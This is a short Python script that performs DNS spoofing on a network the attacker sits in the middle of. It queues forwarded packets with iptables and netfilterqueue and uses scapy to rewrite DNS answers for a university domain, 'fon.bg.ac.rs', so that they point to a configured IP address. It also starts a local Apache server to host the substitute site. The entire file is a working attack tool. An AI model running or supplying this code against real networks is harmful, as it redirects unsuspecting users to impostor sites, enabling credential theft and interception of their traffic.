import subprocess

import netfilterqueue
import scapy.all as scapy

from config.constants import IP_ADDRESS


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "fon.bg.ac.rs" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=IP_ADDRESS)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()
subprocess.run("service apache2 start", shell=True) # start local apache server
subprocess.run(["iptables -I FORWARD -j NFQUEUE","--queue-num 0"], shell=True) # cofigure iptables
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()